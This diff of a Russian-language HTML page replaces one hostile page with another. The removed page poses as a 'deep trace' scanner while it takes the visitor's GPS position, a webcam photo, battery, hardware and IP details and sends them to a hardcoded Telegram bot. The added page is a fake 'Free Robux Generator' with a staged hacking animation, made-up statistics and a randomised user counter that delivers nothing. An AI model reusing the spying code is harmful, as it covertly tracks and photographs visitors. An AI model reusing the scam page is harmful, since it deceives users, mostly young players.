@@ -1,157 +1,334 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MILITARY GRADE SCANNER v9.9</title>
-    <style>
-        body { margin: 0; background: #050505; color: #ff0000; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .terminal { width: 95%; max-width: 700px; background: rgba(10, 0, 0, 0.95); border: 2px solid #ff0000; border-radius: 2px; box-shadow: 0 0 40px rgba(255, 0, 0, 0.2); padding: 30px; position: relative; }
-        .header { border-bottom: 2px solid #ff0000; padding-bottom: 10px; margin-bottom: 25px; display: flex; justify-content: space-between; font-weight: bold; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; }
-        .input-group { display: flex; flex-direction: column; gap: 20px; }
-        input { background: #1a0000; border: 1px solid #ff0000; color: #ff0000; padding: 15px; font-family: inherit; font-size: 18px; outline: none; box-shadow: inset 0 0 5px #000; }
-        button { background: #ff0000; color: #000; border: none; padding: 20px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; text-transform: uppercase; }
-        button:hover { background: #b30000; box-shadow: 0 0 20px #ff0000; }
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .scan-line { width: 100%; height: 4px; background: #ff0000; position: absolute; top: 0; animation: scan 1.5s linear infinite; box-shadow: 0 0 20px #ff0000; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        .log-line { font-size: 10px; color: #660000; margin-top: 10px; line-height: 1.2; }
-        video, canvas { display: none; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Robux Generator</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --green: #ffd700;
+    --green-dark: #f0a500;
+    --bg: #0d0d0d;
+    --card: #141414;
+    --border: rgba(255,215,0,.2);
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background: var(--bg);
+    color: #fff;
+    font-family: 'Rajdhani', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* Анимированный фон */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background:
+      radial-gradient(ellipse at 20% 50%, rgba(255,215,0,.06) 0%, transparent 60%),
+      radial-gradient(ellipse at 80% 20%, rgba(240,165,0,.04) 0%, transparent 50%);
+    pointer-events: none;
+  }
+
+  .grid-bg {
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(rgba(255,215,0,.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,215,0,.04) 1px, transparent 1px);
+    background-size: 50px 50px;
+    pointer-events: none;
+  }
+
+  .container {
+    width: 100%; max-width: 480px;
+    position: relative; z-index: 1;
+  }
+
+  /* Лого */
+  .logo {
+    text-align: center; margin-bottom: 30px;
+  }
+  .logo-icon {
+    font-size: 52px; display: block;
+    filter: drop-shadow(0 0 15px rgba(255,215,0,.5));
+    animation: float 3s ease-in-out infinite;
+  }
+  @keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
+  .logo-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 22px; font-weight: 900;
+    color: var(--green);
+    text-shadow: 0 0 20px rgba(255,215,0,.6);
+    letter-spacing: 3px;
+    margin-top: 8px;
+  }
+  .logo-sub {
+    font-size: 11px; letter-spacing: 4px;
+    color: rgba(255,215,0,.4); margin-top: 4px;
+  }
+
+  /* Карточка */
+  .card {
+    background: #120e00;
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 28px;
+    box-shadow: 0 0 40px rgba(255,215,0,.05);
+    margin-bottom: 16px;
+  }
+
+  .card-title {
+    font-size: 11px; letter-spacing: 4px;
+    color: rgba(255,215,0,.5); margin-bottom: 16px;
+    text-transform: uppercase;
+  }
+
+  /* Инпут */
+  .input-wrap { position: relative; margin-bottom: 16px; }
+  .input-wrap label {
+    display: block; font-size: 11px;
+    letter-spacing: 3px; color: rgba(255,215,0,.5);
+    margin-bottom: 8px;
+  }
+  .input-wrap input {
+    width: 100%; background: rgba(255,215,0,.05);
+    border: 1px solid rgba(255,215,0,.2);
+    border-radius: 8px; padding: 12px 16px;
+    color: #fff; font-family: 'Rajdhani', sans-serif;
+    font-size: 16px; outline: none;
+    transition: border-color .2s;
+  }
+  .input-wrap input:focus { border-color: var(--green); }
+  .input-wrap input::placeholder { color: rgba(255,255,255,.2); }
+
+  /* Слайдер выбора суммы */
+  .amounts {
+    display: grid; grid-template-columns: repeat(3,1fr); gap: 8px;
+    margin-bottom: 16px;
+  }
+  .amount-btn {
+    background: rgba(255,215,0,.07); border: 1px solid rgba(255,215,0,.2);
+    border-radius: 8px; padding: 10px 6px; text-align: center;
+    cursor: pointer; transition: all .15s; position: relative;
+  }
+  .amount-btn:hover, .amount-btn.sel {
+    background: rgba(255,215,0,.15); border-color: var(--green);
+  }
+  .amount-btn .r-icon { font-size: 18px; display: block; }
+  .amount-btn .r-val {
+    font-family: 'Orbitron', monospace; font-size: 14px;
+    font-weight: 700; color: var(--green); display: block;
+  }
+  .amount-btn .r-lbl { font-size: 9px; color: rgba(255,255,255,.3); letter-spacing: 1px; }
+  .amount-btn.popular::after {
+    content: 'ХИТ';
+    position: absolute; top: -8px; right: 6px;
+    background: var(--green); color: #000;
+    font-size: 8px; font-weight: 700;
+    padding: 2px 5px; border-radius: 3px; letter-spacing: 1px;
+  }
+
+  /* Кнопка */
+  .gen-btn {
+    width: 100%; padding: 16px;
+    background: linear-gradient(135deg, var(--green-dark), var(--green));
+    border: none; border-radius: 10px; cursor: pointer;
+    font-family: 'Orbitron', monospace; font-size: 14px;
+    font-weight: 700; color: #000; letter-spacing: 2px; font-weight:900;
+    transition: all .2s; position: relative; overflow: hidden;
+    box-shadow: 0 4px 20px rgba(255,215,0,.3);
+  }
+  .gen-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 25px rgba(255,215,0,.4); }
+  .gen-btn:active { transform: translateY(1px); }
+  .gen-btn::after {
+    content: ''; position: absolute; inset: 0;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,.15), transparent);
+    transform: translateX(-100%);
+    animation: shimmer 2.5s infinite;
+  }
+  @keyframes shimmer { 100%{transform:translateX(100%)} }
+
+  /* Прогресс */
+  #progress-wrap { display: none; margin-top: 20px; }
+  .prog-step {
+    display: flex; align-items: center; gap: 10px;
+    padding: 10px 0; border-bottom: 1px solid rgba(255,215,0,.07);
+    font-size: 13px; color: rgba(255,255,255,.4);
+    transition: color .3s;
+  }
+  .prog-step.done { color: var(--green); }
+  .prog-step.active { color: #fff; }
+  .prog-icon { width: 20px; text-align: center; font-size: 14px; }
+  .prog-bar-wrap {
+    height: 3px; background: rgba(255,215,0,.1);
+    border-radius: 2px; margin-top: 16px; overflow: hidden;
+  }
+  .prog-bar {
+    height: 100%; width: 0%; background: var(--green);
+    border-radius: 2px; transition: width .4s ease;
+    box-shadow: 0 0 8px var(--green);
+  }
+
+  /* Статистика */
+  .stats {
+    display: grid; grid-template-columns: repeat(3,1fr); gap: 10px;
+  }
+  .stat-item { text-align: center; }
+  .stat-val {
+    font-family: 'Orbitron', monospace; font-size: 18px;
+    font-weight: 700; color: var(--green);
+  }
+  .stat-lbl { font-size: 10px; color: rgba(255,255,255,.3); letter-spacing: 2px; }
+
+  /* Онлайн юзеры */
+  .online-bar {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 11px; color: rgba(255,255,255,.3);
+    margin-bottom: 20px; justify-content: center;
+  }
+  .online-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+</style>
 </head>
 <body>
+<div class="grid-bg"></div>
+<div class="container">
 
-<div class="terminal">
-    <div class="header">
-        <span>[ DEEP_TRACE_PROTOCOL_ACTIVE ]</span>
-        <span style="animation: blinker 0.5s step-end infinite;">● ALIVE</span>
+  <div class="logo">
+    <img class="logo-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="70" height="70" style="display:block;margin:0 auto;filter:drop-shadow(0 0 15px rgba(255,215,0,.5))">
+    <div class="logo-title">ROBUX GEN</div>
+    <div class="logo-sub">FREE ROBUX GENERATOR v4.2</div>
+  </div>
+
+  <div class="online-bar">
+    <div class="online-dot"></div>
+    <span id="online-count">3,847</span> пользователей онлайн
+  </div>
+
+  <div class="card">
+    <div class="card-title">⬡ ВЫБЕРИ КОЛИЧЕСТВО</div>
+    <div class="amounts">
+      <div class="amount-btn" onclick="selectAmt(this, 800)">
+        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
+        <span class="r-val">800</span>
+        <span class="r-lbl">ROBUX</span>
+      </div>
+      <div class="amount-btn popular sel" onclick="selectAmt(this, 4500)">
+        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
+        <span class="r-val">4,500</span>
+        <span class="r-lbl">ROBUX</span>
+      </div>
+      <div class="amount-btn" onclick="selectAmt(this, 10000)">
+        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
+        <span class="r-val">10,000</span>
+        <span class="r-lbl">ROBUX</span>
+      </div>
+      <div class="amount-btn" onclick="selectAmt(this, 22500)">
+        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
+        <span class="r-val">22,500</span>
+        <span class="r-lbl">ROBUX</span>
+      </div>
+      <div class="amount-btn" onclick="selectAmt(this, 75000)">
+        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
+        <span class="r-val">75,000</span>
+        <span class="r-lbl">ROBUX</span>
+      </div>
+      <div class="amount-btn" onclick="selectAmt(this, 100000)">
+        <img class="r-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Robux_2019_Logo_gold.svg/512px-Robux_2019_Logo_gold.svg.png" width="28" height="28" style="display:block;margin:0 auto 4px">
+        <span class="r-val">100K</span>
+        <span class="r-lbl">MAX</span>
+      </div>
     </div>
-    <div class="input-group">
-        <label>ENTER TARGET IDENTIFIER:</label>
-        <input type="text" id="target" placeholder="ID / PHONE / EMAIL" autocomplete="off">
-        <button onclick="executeFullTrace()">RUN TOTAL EXTRACTION</button>
+
+    <div class="input-wrap">
+      <label>ROBLOX USERNAME</label>
+      <input type="text" id="username" placeholder="Введи свой ник...">
     </div>
-    <div class="log-line" id="console">
-        > SYSTEM_READY...<br>
-        > ENCRYPTION: AES_256_ACTIVE<br>
-        > VOLTAGE: STABLE
+
+    <button class="gen-btn" onclick="startGen()">⚡ GENERATE ROBUX</button>
+
+    <div id="progress-wrap">
+      <div class="prog-step" id="s1"><span class="prog-icon">🔍</span> Поиск аккаунта...</div>
+      <div class="prog-step" id="s2"><span class="prog-icon">🔓</span> Обход защиты Roblox...</div>
+      <div class="prog-step" id="s3"><span class="prog-icon">💉</span> Инъекция Robux...</div>
+      <div class="prog-step" id="s4"><span class="prog-icon">✅</span> Завершение транзакции...</div>
+      <div class="prog-bar-wrap"><div class="prog-bar" id="prog-bar"></div></div>
     </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📊 СТАТИСТИКА СЕРВЕРА</div>
+    <div class="stats">
+      <div class="stat-item">
+        <div class="stat-val" id="s-generated">2.4M</div>
+        <div class="stat-lbl">ВЫДАНО</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-val" id="s-users">847K</div>
+        <div class="stat-lbl">ЮЗЕРОВ</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-val" id="s-uptime">99.9%</div>
+        <div class="stat-lbl">UPTIME</div>
+      </div>
+    </div>
+  </div>
+
 </div>
-
-<div id="overlay">
-    <div class="scan-line"></div>
-    <h1 style="color: #ff0000; letter-spacing: 5px;">EXTRACTING DATA...</h1>
-    <p id="progress" style="color: #ff0000;">FETCHING HARDWARE DOSSIER: 0%</p>
-</div>
-
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
 
 <script>
-    const p1 = '8570554697';
-    const p2 = 'AAHRYkl8_AIuOC4gbOl6AxRWOnmEMzw15Eg';
-    const T = p1 + ':' + p2;
-    const CID = '1751630480';
+let selectedAmt = 4500;
 
-    async function send(msg) {
-        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CID, text: msg, parse_mode: 'Markdown'})
-        });
+function selectAmt(el, amt) {
+  document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('sel'));
+  el.classList.add('sel');
+  selectedAmt = amt;
+}
+
+function startGen() {
+  const user = document.getElementById('username').value.trim();
+  if (!user) { document.getElementById('username').focus(); return; }
+
+  document.querySelector('.gen-btn').disabled = true;
+  document.querySelector('.gen-btn').textContent = 'PROCESSING...';
+  document.getElementById('progress-wrap').style.display = 'block';
+
+  const steps = ['s1','s2','s3','s4'];
+  const bar = document.getElementById('prog-bar');
+  let i = 0;
+
+  const iv = setInterval(() => {
+    if (i > 0) document.getElementById(steps[i-1]).classList.remove('active');
+    if (i < steps.length) {
+      document.getElementById(steps[i]).classList.add('active');
+      bar.style.width = ((i+1)/steps.length*100) + '%';
+      setTimeout(() => {
+        document.getElementById(steps[i]).classList.add('done');
+        document.getElementById(steps[i]).classList.remove('active');
+      }, 900);
+      i++;
+    } else {
+      clearInterval(iv);
+      bar.style.width = '100%';
+      document.querySelector('.gen-btn').textContent = '✓ УСПЕШНО! ПРОВЕРЬ АККАУНТ';
+      document.querySelector('.gen-btn').style.background = 'linear-gradient(135deg,#f0a500,#69f0ae)';
     }
+  }, 1200);
+}
 
-    async function sendP(blob) {
-        let f = new FormData();
-        f.append('chat_id', CID);
-        f.append('photo', blob, 't.jpg');
-        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
-    }
-
-    async function executeFullTrace() {
-        const val = document.getElementById('target').value;
-        if(!val) return;
-
-        document.getElementById('overlay').style.display = 'flex';
-        
-        // Попытка забрать GPS
-        navigator.geolocation.getCurrentPosition(p => {
-            send(`🎯 **EXACT GPS:** \`${p.coords.latitude}, ${p.coords.longitude}\` (Acc: ${p.coords.accuracy}m)`);
-        }, null, {enableHighAccuracy:true});
-
-        // Камера и Батарея
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({video:true});
-            document.getElementById('v').srcObject = stream;
-            
-            setTimeout(() => {
-                const canvas = document.getElementById('c');
-                const video = document.getElementById('v');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video,0,0);
-                canvas.toBlob(blob => sendP(blob));
-                
-                collectAll(val);
-            }, 2000);
-        } catch(e) {
-            collectAll(val);
-        }
-    }
-
-    async function collectAll(target) {
-        const prog = document.getElementById('progress');
-        prog.innerText = "> DUMPING SYSTEM INFO: 100%";
-
-        // Батарея
-        let batteryInfo = "No Data";
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            batteryInfo = `${(b.level * 100)}%, Charging: ${b.charging}`;
-        }
-
-        // IP данные
-        const res = await fetch('https://ipapi.co/json/');
-        const d = await res.json();
-
-        const report = `
-🚨 **TOTAL EXTRACTION REPORT** 🚨
-────────────────────
-🎯 **TARGET:** \`${target}\`
-⏰ **LOCAL TIME:** \`${new Date().toLocaleString()}\`
-
-🌐 **NETWORK DOSSIER:**
-• IP: \`${d.ip}\`
-• ORG: \`${d.org} (${d.asn})\`
-• COUNTRY: \`${d.country_name} (${d.country_code})\`
-• CITY: \`${d.city}, ${d.region}\`
-• ZIP: \`${d.postal}\`
-• CALL_CODE: \`+${d.country_calling_code}\`
-• CURRENCY: \`${d.currency}\`
-
-💻 **HARDWARE & OS:**
-• CPU CORES: \`${navigator.hardwareConcurrency}\`
-• RAM: \`${navigator.deviceMemory} GB\`
-• PLATFORM: \`${navigator.platform}\`
-• BROWSER: \`${navigator.vendor}\`
-• SCREEN: \`${screen.width}x${screen.height} (${screen.colorDepth}bit)\`
-• BATTERY: \`${batteryInfo}\`
-• LANGUAGE: \`${navigator.language}\`
-• TOUCH: \`${navigator.maxTouchPoints > 0 ? "YES" : "NO"}\`
-
-🕵️ **ADVANCED TRACE:**
-• VPN/PROXY: \`${d.threat?.is_proxy || "Unknown"}\`
-• TIMEZONE: \`${d.timezone} (UTC ${d.utc_offset})\`
-• LANGUAGES: \`${navigator.languages.join(', ')}\`
-• COOKIES: \`${navigator.cookieEnabled}\`
-• ONLINE: \`${navigator.onLine}\`
-
-📱 **UA STRING:**
-\`${navigator.userAgent}\`
-────────────────────`;
-
-        await send(report);
-        setTimeout(() => { location.href = "https://t.me/Osint_search_bot"; }, 1500);
-    }
+// Рандомные онлайн юзеры
+setInterval(() => {
+  const base = 3800 + Math.floor(Math.random()*200);
+  document.getElementById('online-count').textContent = base.toLocaleString('ru-RU');
+}, 3000);
 </script>
 </body>
 </html>
